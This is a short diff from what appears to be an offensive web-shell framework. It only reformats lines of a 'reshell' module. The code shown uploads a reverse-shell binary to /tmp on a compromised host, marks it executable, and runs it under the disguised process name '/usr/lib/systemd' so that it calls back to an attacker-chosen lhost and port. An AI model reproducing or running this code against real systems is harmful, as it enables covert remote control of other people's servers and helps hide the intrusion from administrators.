@@ -20,8 +20,10 @@ proc_close($process);
 """
 
 
-@alias(True, func_alias="rs", _type="SHELL", l="lhost", p="port", m="mode", f="fakename")
-def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"):
+@alias(True, func_alias="rs", _type="SHELL",
+       l="lhost", p="port", m="mode", f="fakename")
+def run(lhost: str, port: int, mode: int = 0,
+        fakename: str = "/usr/lib/systemd"):
     """
     reshell
 
@@ -59,9 +61,11 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     else:
         print(color.yellow(f"Use Mode 2->upload"))
         filename = encrypt(f"{lhost}-{port}")
-        if not upload(path.join(gget("root_path"), "auxiliary", "reshell", "reverse_server_x86_64"), "/tmp/%s" % filename, True):
+        if not upload(path.join(gget("root_path"), "auxiliary", "reshell",
+                      "reverse_server_x86_64"), "/tmp/%s" % filename, True):
             return
-        command = get_system_code(f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}", False)
+        command = get_system_code(
+            f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}", False)
     t = Thread(target=delay_send, args=(2, command))
     t.setDaemon(True)
     t.start()
